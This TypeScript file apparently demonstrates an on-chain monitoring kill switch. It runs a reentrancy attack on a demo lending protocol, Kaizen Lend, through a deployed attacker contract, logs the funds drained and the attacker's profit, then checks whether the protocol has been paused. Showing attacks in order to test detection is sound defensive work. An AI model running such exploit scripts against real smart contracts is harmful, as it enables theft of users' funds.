 
import { ethers, Contract } from "ethers";
import {
  banner, step, success, warn, etherscan, sleep, waitAndLog, eth,
  getAttackerWallet, C,
  REENTRANCY_ABI, LENDING_ABI,
} from "./utils";

const DEPTH = 7;  

async function main() {
  banner("ATTACK 1: REENTRANCY  (The DAO / Cream Finance pattern)");

  const attacker  = getAttackerWallet();
  const provider  = attacker.provider!;

  const protocol = new Contract(
    process.env.KAIZEN_LEND_ADDRESS!,
    LENDING_ABI,
    attacker
  );
  const attackContract = new Contract(
    process.env.REENTRANCY_ATTACKER_ADDRESS!,
    REENTRANCY_ABI,
    attacker
  );
 
  const tvlBefore  = await protocol.totalLiquidity() as bigint;
  const shareValue = await protocol.getShareValue(process.env.REENTRANCY_ATTACKER_ADDRESS!) as bigint;

  console.log(`${C.dim("Protocol TVL:")}      ${eth(tvlBefore)}`);
  console.log(`${C.dim("Attacker position:")} ${eth(shareValue)}`);
  console.log(`${C.dim("Attack depth:")}      ${DEPTH} reentrant calls`);
  console.log();
 
  if (shareValue === 0n) {
    step(1, "Seeding attacker position in protocol...");
    const seedTx = await attackContract.seedPosition({
      value: ethers.parseEther("0.02"),
    });
    await waitAndLog(seedTx, "Position seeded");
  } else {
    step(1, `Attacker already has position: ${eth(shareValue)}`);
  }
 
  step(2, `Launching reentrancy attack with depth ${DEPTH}...`);
  step(2, C.red("Each reentrant call steals from the same shares before state resets."));
 
  attackContract.on("ReentrantCall", (depth: bigint, contractBalance: bigint) => {
    console.log(
      `  ${C.red("⟳")} Reentrant call ${depth.toString()} | protocol balance: ${eth(contractBalance)}`
    );
  });

  attackContract.on("AttackComplete", (totalDrained: bigint, depth: bigint) => {
    console.log();
    success(
      C.bold(`Attack complete: ${eth(totalDrained)} drained over ${depth.toString()} recursive calls`)
    );
  });

  const attackTx = await attackContract.attack(DEPTH, {
    gasLimit: 800_000,
  });

  const receipt = await waitAndLog(attackTx, "Attack transaction confirmed");
  console.log();
 
  await sleep(3000);

  const tvlAfter       = await protocol.totalLiquidity() as bigint;
  const attackerProfit = await attackContract.getBalance() as bigint;
  const isPaused       = await protocol.isPaused() as boolean;

  step(3, "Post-attack state:");
  console.log(`  ${C.dim("Protocol TVL before:")} ${eth(tvlBefore)}`);
  console.log(`  ${C.dim("Protocol TVL after:")}  ${eth(tvlAfter)}`);
  console.log(`  ${C.dim("TVL drained:")}         ${eth(tvlBefore - tvlAfter)}`);
  console.log(`  ${C.dim("Attacker profit:")}      ${eth(attackerProfit)}`);
  console.log();

  if (isPaused) {
    success(C.bold("KAIZEN KILL SWITCH FIRED — Protocol is paused"));
    warn("Attack detected and halted autonomously");
  } else {
    warn("Protocol not yet paused — Kaizen may be scoring the block...");
    console.log(C.dim("  (Kill switch fires within 1 block of Kaizen detecting the anomaly)"));
  }

  console.log();
  console.log(C.dim(`  Attack tx: ${etherscan(attackTx.hash)}`));
  console.log(C.dim(`  Block:     ${receipt.blockNumber}`));
 
  attackContract.removeAllListeners();
}

main().catch(e => {
  console.error(C.red("Attack failed:"), e.message);
  process.exit(1);
});